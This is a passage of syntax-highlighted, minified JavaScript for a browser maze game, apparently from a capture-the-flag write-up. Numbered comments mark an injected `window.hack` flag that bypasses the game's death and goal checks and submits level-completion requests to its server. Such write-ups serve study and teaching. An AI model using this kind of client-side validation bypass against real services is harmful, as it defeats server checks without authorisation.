                                            <span class="nx">x</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">l</span><span class="p">(</span><span class="nx">y</span> <span class="o">=&gt;</span> <span class="nx">B</span><span class="p">[</span><span class="nx">K</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">y</span><span class="p">),</span> <span class="mi">2</span><span class="p">));</span>
                                        <span class="p">}</span>
                                    <span class="p">}</span>
                                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                    <span class="nx">F</span><span class="o">++</span><span class="p">;</span>
                                    <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
                                <span class="p">}</span>
                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                <span class="nx">E</span><span class="o">++</span><span class="p">;</span>
                                <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
                            <span class="p">}</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                            <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">];</span>
                        <span class="p">}</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">];</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">];</span>
                <span class="p">}</span>
                <span class="nx">B</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">D</span><span class="p">);</span>
                <span class="nx">G</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">L</span> <span class="o">=</span> <span class="nx">w</span><span class="p">()</span> <span class="o">+</span> <span class="nx">w</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="nx">w</span><span class="p">()</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="nx">w</span><span class="p">()</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">L</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nx">B</span><span class="p">.</span><span class="nx">push</span><span class="p">(...</span><span class="nb">Array</span><span class="p">(</span><span class="nx">L</span><span class="p">).</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">D</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
                <span class="nx">G</span> <span class="o">+=</span> <span class="nx">L</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nx">z</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nx">z</span><span class="p">();</span>
        <span class="nx">C</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">k</span><span class="p">).</span><span class="nx">fill</span><span class="p">([]).</span><span class="nx">map</span><span class="p">((</span><span class="nx">_</span><span class="p">,</span> <span class="nx">M</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">B</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">j</span><span class="p">));</span>
        <span class="nx">C</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">B</span><span class="p">[</span><span class="s2">"e"</span><span class="p">];</span>
        <span class="nx">C</span><span class="p">[</span><span class="s2">"n"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">B</span><span class="p">[</span><span class="s2">"n"</span><span class="p">];</span>
        <span class="k">return</span> <span class="nx">C</span><span class="p">;</span>
    <span class="p">},</span>
    <span class="nx">N</span> <span class="o">=</span> <span class="p">(</span><span class="nx">O</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">P</span> <span class="o">=</span> <span class="p">{</span>
                <span class="mi">0</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="mi">2</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="mi">3</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="mi">4</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="mi">5</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="mi">6</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="mi">7</span><span class="p">:</span> <span class="mi">0</span>
            <span class="p">},</span>
            <span class="nx">Q</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"b"</span><span class="p">),</span>
            <span class="nx">R</span><span class="p">,</span> <span class="nx">M</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">S</span> <span class="o">=</span> <span class="nx">O</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">length</span><span class="p">,</span>
            <span class="nx">T</span> <span class="o">=</span> <span class="nx">O</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
            <span class="nx">U</span><span class="p">,</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">[</span>
                <span class="p">[]</span>
            <span class="p">],</span>
            <span class="nx">V</span> <span class="o">=</span> <span class="p">[</span>
                <span class="p">[]</span>
            <span class="p">];</span>
        <span class="nx">Q</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(;</span> <span class="nx">M</span> <span class="o">&lt;</span> <span class="nx">T</span><span class="p">;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">push</span><span class="p">([]),</span> <span class="nx">V</span><span class="p">.</span><span class="nx">push</span><span class="p">([]),</span> <span class="nx">Q</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"br"</span><span class="p">)),</span> <span class="nx">M</span><span class="o">++</span><span class="p">)</span>
            <span class="k">for</span> <span class="p">(</span><span class="nx">R</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">R</span> <span class="o">&lt;</span> <span class="nx">S</span><span class="p">;</span> <span class="nx">R</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">W</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"i"</span><span class="p">),</span>
                    <span class="nx">X</span><span class="p">,</span> <span class="nx">Y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
                    <span class="nx">Z</span> <span class="o">=</span> <span class="nx">O</span><span class="p">[</span><span class="nx">M</span><span class="p">][</span><span class="nx">R</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
                <span class="nx">V</span><span class="p">[</span><span class="nx">V</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">Z</span> <span class="k">in</span> <span class="nx">P</span> <span class="o">&amp;&amp;</span> <span class="nx">Z</span> <span class="o">!=</span> <span class="mi">7</span><span class="p">);</span>
                <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">aa</span> <span class="k">of</span> <span class="p">[</span>
                        <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
                        <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
                        <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
                        <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
                    <span class="p">])</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">R</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">R</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">S</span> <span class="o">||</span> <span class="nx">M</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">M</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">Y</span> <span class="o">+=</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">Z</span> <span class="k">in</span> <span class="nx">P</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">Y</span> <span class="o">+=</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">O</span><span class="p">[</span><span class="nx">M</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">R</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="mi">0</span><span class="p">]</span> <span class="k">in</span> <span class="nx">P</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nx">Y</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">O</span><span class="p">[</span><span class="nx">M</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">R</span> <span class="o">+</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="nx">Z</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">aa</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="nx">W</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="s2">"tt-"</span> <span class="o">+</span> <span class="nx">Z</span> <span class="o">+</span> <span class="s2">" s-"</span> <span class="o">+</span> <span class="nx">Y</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">Z</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">X</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
                    <span class="nx">X</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="s2">"p"</span><span class="p">;</span>
                    <span class="nx">Q</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">X</span><span class="p">);</span>
                    <span class="nx">U</span> <span class="o">=</span> <span class="p">[</span><span class="nx">R</span><span class="p">,</span> <span class="nx">M</span><span class="p">,</span> <span class="nx">X</span><span class="p">];</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">Z</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">X</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"span"</span><span class="p">);</span>
                    <span class="nx">X</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">O</span><span class="p">[</span><span class="nx">M</span><span class="p">][</span><span class="nx">R</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
                    <span class="nx">W</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">X</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">p</span><span class="p">[</span><span class="nx">p</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">W</span><span class="p">);</span>
                <span class="nx">Q</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">W</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="nx">p</span><span class="p">[</span><span class="nx">p</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">U</span><span class="p">;</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">V</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">p</span><span class="p">;</span>
    <span class="p">},</span>
    <span class="nx">ab</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"oXxdTNzxWzwk+kVZXrdCvRQjEruXr0uth3RKKXBwdtAFuKfHbpm75uet"</span><span class="p">,</span> <span class="s2">"peGRxJXGzbj1OuTYuv2CMBZu344KNN3/wVJbTx06JnocZRToBpv2V26DXJuURzUZfCBQb3XhoC+UuQ=="</span><span class="p">,</span> <span class="s2">"AYuBi2TCFSSTldPFeNGFgp5mpUF8Jpyt1lyje1421YSC"</span><span class="p">,</span> <span class="s2">"B+8GHfsFE2rWM3LsgwMNsqG17hLapAthdZ3gbVIJO5OLKXLd8kd44P/GsawWPduppG2NSKmK08yk/MdLz5ue"</span><span class="p">,</span> <span class="s2">"sZQcnOeejN6HPHs7hd4Y7ssMekj/y6WEX0AJ9AzAb7pMDq4PNAmNXJ5EA8r86gCCcg=="</span><span class="p">,</span> <span class="s2">"7dPaq/7ZuGJBtElSb4wtcI416w7HiptanCgML/iqN5ojSty0B9rLqLRWhA=="</span><span class="p">,</span> <span class="s2">"ahBNwDtQdpZE/HJpkleXRWal/9SLEoRdpxT6euFi3g1x697Zv9I="</span><span class="p">,</span> <span class="s2">"U16x1uwzN42WTgnE9mQeOrjeITxEm0G0Fv5D3f2UOldxbqypor1adyzo9TA5UGgMa01weGRXi2obnX7VEqV6Lxqfl5zTY1ev1xZ1Fp42/YK9dDm2r4uiaGaqs5AF+ePalYzRkslqGU9gd3Qegqv6qvZZJ/laVr8TkQr8ClWZwdmkbHtsKDGA9rHKgRXhEaVnVCgAGDqffcu++HxhhZu0bJJeZigPHaFhg9kSXENBFAZNWE/+vUpJxBIcjxKQFeyESHsuWNvqIDSyZkZV2vptN21xSDISepZ/D0zz3jXNpX+kTdsHO+vHNCuXpV2db8GGc/Cu2oQ//m2fAaUR4OTG6nm+qbFU9tfy+JOSX0Zu4fPfjMwtJ887eXRoehSvAZNlIpQMx6Z6qz0+Uw=="</span><span class="p">],</span>
    <span class="nx">ac</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x094</span><span class="p">,</span> <span class="mh">0x103</span><span class="p">,</span> <span class="mh">0x04F</span><span class="p">,</span> <span class="mh">0x017</span><span class="p">,</span> <span class="mh">0x101</span><span class="p">],</span>
    <span class="nx">ad</span> <span class="o">=</span> <span class="p">[],</span>
    <span class="nx">ae</span> <span class="o">=</span> <span class="p">[],</span>
    <span class="nx">af</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="nx">O</span><span class="p">,</span> <span class="nx">ag</span><span class="p">,</span> <span class="nx">ah</span><span class="p">,</span> <span class="nx">ai</span><span class="p">,</span> <span class="nx">aj</span><span class="p">,</span> <span class="nx">V</span><span class="p">,</span> <span class="nx">ak</span><span class="p">,</span> <span class="nx">al</span><span class="p">,</span> <span class="nx">am</span><span class="p">,</span> <span class="nx">an</span> <span class="o">=</span> <span class="p">[],</span>
    <span class="nx">ao</span> <span class="o">=</span> <span class="p">[],</span>
    <span class="nx">ap</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="nx">aq</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ar</span><span class="p">,</span> <span class="k">as</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">at</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nx">an</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">ar</span><span class="p">(</span><span class="o">++</span><span class="nx">at</span><span class="p">);</span>
            <span class="nx">at</span> <span class="o">==</span> <span class="mi">16</span> <span class="p">?</span> <span class="k">as</span><span class="p">()</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">return</span> <span class="nx">at</span> <span class="o">&gt;=</span> <span class="mi">16</span><span class="p">;</span>
        <span class="p">});</span>
    <span class="p">},</span>
    <span class="nx">au</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">ag</span> <span class="o">=</span> <span class="nb">Uint8Array</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="nx">ab</span><span class="p">[</span><span class="nx">af</span><span class="p">]),</span> <span class="nx">c</span> <span class="o">=&gt;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">af</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">ac</span> <span class="o">=</span> <span class="nx">ad</span><span class="p">;</span>
            <span class="nx">ae</span><span class="p">.</span><span class="nx">map</span><span class="p">(({</span>
                <span class="nx">s</span><span class="p">,</span>
                <span class="nx">e</span><span class="p">,</span>
                <span class="nx">k</span>
            <span class="p">})</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">av</span> <span class="o">=</span> <span class="nb">Uint8Array</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="nx">k</span><span class="p">),</span> <span class="nx">c</span> <span class="o">=&gt;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span>
                    <span class="nx">aw</span> <span class="o">=</span> <span class="nx">s</span><span class="p">;</span>
                <span class="k">for</span> <span class="p">(;</span> <span class="nx">aw</span> <span class="o">&lt;</span> <span class="nx">e</span><span class="p">;</span> <span class="nx">aw</span><span class="o">++</span><span class="p">)</span> <span class="nx">ag</span><span class="p">[</span><span class="nx">aw</span><span class="p">]</span> <span class="o">^=</span> <span class="nx">av</span><span class="p">[</span><span class="nx">aw</span> <span class="o">-</span> <span class="nx">s</span><span class="p">];</span>
            <span class="p">});</span>
        <span class="p">}</span>
        <span class="nx">ap</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nx">an</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="nx">ao</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="nx">ah</span> <span class="o">=</span> <span class="nx">N</span><span class="p">(</span><span class="nx">O</span> <span class="o">=</span> <span class="nx">a</span><span class="p">(</span><span class="nx">ag</span><span class="p">,</span> <span class="nx">ac</span><span class="p">));</span>
        <span class="nx">ai</span> <span class="o">=</span> <span class="nx">ah</span><span class="p">[</span><span class="nx">ah</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">2</span><span class="p">];</span>
        <span class="nx">aj</span> <span class="o">=</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
        <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ak</span> <span class="o">=</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">;</span>
        <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="p">(</span><span class="nx">al</span> <span class="o">=</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">;</span>
        <span class="nx">am</span> <span class="o">=</span> <span class="nx">O</span><span class="p">[</span><span class="s2">"e"</span><span class="p">];</span>
        <span class="nx">energybar</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="s2">"0px"</span><span class="p">;</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">O</span><span class="p">[</span><span class="s2">"n"</span><span class="p">];</span>
        <span class="nx">V</span> <span class="o">=</span> <span class="nx">ah</span><span class="p">[</span><span class="nx">ah</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
    <span class="p">},</span>
    <span class="nx">ax</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">ak</span> <span class="o">=</span> <span class="nx">ak</span> <span class="o">*</span> <span class="p">.</span><span class="mi">85</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">*</span> <span class="p">.</span><span class="mi">15</span><span class="p">;</span>
        <span class="nx">al</span> <span class="o">=</span> <span class="nx">al</span> <span class="o">*</span> <span class="p">.</span><span class="mi">85</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">*</span> <span class="p">.</span><span class="mi">15</span><span class="p">;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"b"</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="nx">ak</span> <span class="o">+</span> <span class="mi">320</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"b"</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="nx">al</span> <span class="o">+</span> <span class="mi">240</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]])</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">++</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">[</span><span class="mi">0</span><span class="p">]())</span> <span class="p">{</span>
            <span class="nx">an</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="nb">window</span><span class="p">.</span><span class="nx">hack</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 2. trigger this code block by setting window.hack</span>
                <span class="kd">let</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">O</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]],</span>
                    <span class="nx">az</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">Z</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">ap</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
                    <span class="nx">energybar</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="s2">"304px"</span><span class="p">;</span>
                    <span class="nx">energybar</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">" rip"</span><span class="p">;</span>
                    <span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">Z</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">||</span> <span class="nb">window</span><span class="p">.</span><span class="nx">hack</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 3. trigger this code block by setting window.hack</span>
                    <span class="nx">energybar</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">" ^___^"</span><span class="p">;</span>
                    <span class="nx">ap</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
                    <span class="nx">az</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>
                    <span class="nx">az</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"l"</span><span class="p">,</span> <span class="nx">af</span><span class="p">);</span>
                    <span class="nx">az</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"p"</span><span class="p">,</span> <span class="nx">ao</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">""</span><span class="p">));</span>
                    <span class="nx">fetch</span><span class="p">(</span><span class="s2">"p.php"</span><span class="p">,</span> <span class="p">{</span>
                        <span class="na">method</span><span class="p">:</span> <span class="s2">"POST"</span><span class="p">,</span>
                        <span class="na">body</span><span class="p">:</span> <span class="nx">az</span>
                    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">ba</span> <span class="o">=&gt;</span> <span class="nx">ba</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">ba</span> <span class="o">=&gt;</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">ba</span><span class="p">[</span><span class="s2">"s"</span><span class="p">]</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">af</span><span class="o">++</span><span class="p">;</span>
                            <span class="nx">ac</span> <span class="o">=</span> <span class="nx">ba</span><span class="p">[</span><span class="s2">"k"</span><span class="p">];</span>
                            <span class="k">if</span> <span class="p">(</span><span class="nx">ac</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="nx">ad</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ac</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
                            <span class="k">if</span> <span class="p">(</span><span class="s2">"x"</span> <span class="k">in</span> <span class="nx">ba</span><span class="p">)</span> <span class="nx">ae</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ba</span><span class="p">[</span><span class="s2">"x"</span><span class="p">]);</span>
                        <span class="p">}</span>
                        <span class="nx">au</span><span class="p">();</span>
                    <span class="p">});</span>
                <span class="p">}</span>
